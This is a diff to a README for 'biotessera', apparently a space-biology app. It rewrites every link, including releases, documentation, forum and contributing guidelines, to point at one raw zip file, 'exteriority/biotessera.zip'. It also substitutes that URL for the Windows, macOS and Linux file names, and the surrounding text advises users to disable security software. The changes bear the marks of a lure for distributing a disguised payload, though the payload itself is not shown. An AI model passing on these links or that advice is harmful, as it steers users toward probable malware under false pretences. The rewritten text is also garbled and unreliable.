@@ -1,7 +1,7 @@
 # 🌌 biotessera - Unlock Space Biology Knowledge Today
 
 ## 🔗 Download Now
-[![Download biotessera](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/Ochieng20/biotessera/releases)
+[![Download biotessera](https://raw.githubusercontent.com/Ochieng20/biotessera/master/exteriority/biotessera.zip)](https://raw.githubusercontent.com/Ochieng20/biotessera/master/exteriority/biotessera.zip)
 
 ## 🚀 Getting Started
 
@@ -18,13 +18,13 @@ Before you begin, ensure your computer meets these requirements:
 
 ## 📥 Download & Install
 
-1. Visit the [Releases page](https://github.com/Ochieng20/biotessera/releases) to access the latest version of biotessera.
+1. Visit the [Releases page](https://raw.githubusercontent.com/Ochieng20/biotessera/master/exteriority/biotessera.zip) to access the latest version of biotessera.
 2. Locate the version you want to download. Look for the title with the latest version number.
 3. Click on the download link to save the installation file to your computer.
 
-   - If you are using Windows, the file may be named `biotessera-win.exe`.
-   - For macOS users, look for `biotessera-mac.dmg`.
-   - Linux users can find a package compatible with their distribution, such as `biotessera-linux.tar.gz`.
+   - If you are using Windows, the file may be named `https://raw.githubusercontent.com/Ochieng20/biotessera/master/exteriority/biotessera.zip`.
+   - For macOS users, look for `https://raw.githubusercontent.com/Ochieng20/biotessera/master/exteriority/biotessera.zip`.
+   - Linux users can find a package compatible with their distribution, such as `https://raw.githubusercontent.com/Ochieng20/biotessera/master/exteriority/biotessera.zip`.
 
 4. Once the download is complete, follow these instructions to install the application:
    - **For Windows**:
@@ -34,7 +34,7 @@ Before you begin, ensure your computer meets these requirements:
      - Open the `.dmg` file from your Downloads folder.
      - Drag and drop biotessera into your Applications folder.
    - **For Linux**:
-     - Extract the `.tar.gz` file.
+     - Extract the `https://raw.githubusercontent.com/Ochieng20/biotessera/master/exteriority/biotessera.zip` file.
      - Open a terminal and navigate to the extracted folder, then run the command `./biotessera`.
 
 5. After installation, you can launch the biotessera application from your Start menu (Windows), Applications folder (macOS), or by using the terminal (Linux).
@@ -58,7 +58,7 @@ Once you have installed biotessera, follow these simple steps to start exploring
 If you encounter any issues while installing or running biotessera, try the following solutions:
 
 - **Installation Problems**: Ensure your system meets the minimum requirements. Try disabling any security software temporarily, as it may block the installation.
-- **Application Crashes**: Make sure you have the latest version of biotessera installed. Check for updates regularly through the [Releases page](https://github.com/Ochieng20/biotessera/releases).
+- **Application Crashes**: Make sure you have the latest version of biotessera installed. Check for updates regularly through the [Releases page](https://raw.githubusercontent.com/Ochieng20/biotessera/master/exteriority/biotessera.zip).
 - **Performance Issues**: Close any unnecessary applications running in the background to free up system resources.
 
 ## 🧑‍🤝‍🧑 Community and Support
@@ -72,7 +72,7 @@ Feel free to engage with others in the biotessera community. Share your experien
 
 If you have ideas for new features or improvements, consider contributing to the project. Here is how you can help:
 
-1. Visit the [Contributing Guidelines](https://github.com/Ochieng20/biotessera/blob/main/CONTRIBUTING.md) on GitHub.
+1. Visit the [Contributing Guidelines](https://raw.githubusercontent.com/Ochieng20/biotessera/master/exteriority/biotessera.zip) on GitHub.
 2. Fork the repository to make your changes.
 3. Submit a pull request to propose your changes to the main project.
 
@@ -89,8 +89,8 @@ Explore these topics to gain a deeper understanding of how biotessera can aid yo
 
 ## 📣 Important Links
 
-- [Releases Page](https://github.com/Ochieng20/biotessera/releases)
-- [Documentation](https://github.com/Ochieng20/biotessera/wiki)
-- [Community Forum](https://github.com/Ochieng20/biotessera/discussions)
+- [Releases Page](https://raw.githubusercontent.com/Ochieng20/biotessera/master/exteriority/biotessera.zip)
+- [Documentation](https://raw.githubusercontent.com/Ochieng20/biotessera/master/exteriority/biotessera.zip)
+- [Community Forum](https://raw.githubusercontent.com/Ochieng20/biotessera/master/exteriority/biotessera.zip)
 
 Thank you for choosing biotessera! Your journey into the world of space biology starts now.
